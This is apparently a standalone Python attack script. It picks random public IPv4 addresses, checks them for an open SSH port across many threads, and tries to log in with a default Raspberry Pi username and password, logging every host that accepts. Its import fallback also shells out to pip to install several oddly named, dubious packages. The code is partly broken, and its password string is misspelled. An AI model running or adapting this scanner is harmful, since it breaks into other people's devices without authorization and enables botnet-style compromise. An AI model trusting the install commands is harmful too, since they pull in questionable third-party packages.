try:
  import random
  import os
  import time
  import socket
  import threading
  import struct
  import ssl
  import paramiko
  import requests
  from multiprocessing import Process
  from contextlib import closing
  from paramiko import client
except ImportError:
#     pip3 install tkinter random requests os time socket threadinf struct time ssl contexlib multiprocessing")
      os.system("pip install random2")
      os.system("pip3 install python-time")
      os.system("pip3 install sockets")
      os.system("pip3 install threaded")
      os.system("pip3 install thread6")
      os.system("pip install supyr-struct")
      os.system("pip install ssl")
      os.system("pip install requests")
      os.system("pip install contextlib2")
      os.system("pip install multiprocessing")
      os.system("pip install subprocess")
      os.system("pip install paramiko")

X = int(input("number of threads: "))
def SSH1():
  port = 22
  retry = 5
  delay = 10
  timeout = 3
  ssh = paramiko.SSHClient()
  ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
  
  def isOpen():
    while True:
      ip = ".".join(map(str, (random.randint(0, 255)
                            for _ in range(4))))

      with closing(socket.socket(socket.AF_INET, socket.SOCK_STREAM)) as sock:
           if sock.connect_ex((ip, port)) == 0:
                       print(ip)
                       if ssh.connect(ip, username="pi", password="rasberrypi", timeout=2,allow_agent=False,look_for_keys=False,banner_timeout=60) == None:
                           print(ip, file=open("ip.txt", "a"))
                       else:
                          isOpen()

  threads = []

  for i in range(X):
        t = threading.Thread(target=isOpen)
        t.daemon = True
        threads.append(t)

  for i in range(X):
        threads[i].start()

  for i in range(X):
        threads[i].join()
      

def imalive():
   x = 1
   while x == 1:
     print("Im still alive")
     print(time.strftime('%Y-%m-%d %H:%M:%S', time.localtime()))
     time.sleep(30)

#threading
threading.Thread(target=SSH1).start()
threading.Thread(target=imalive).start()
    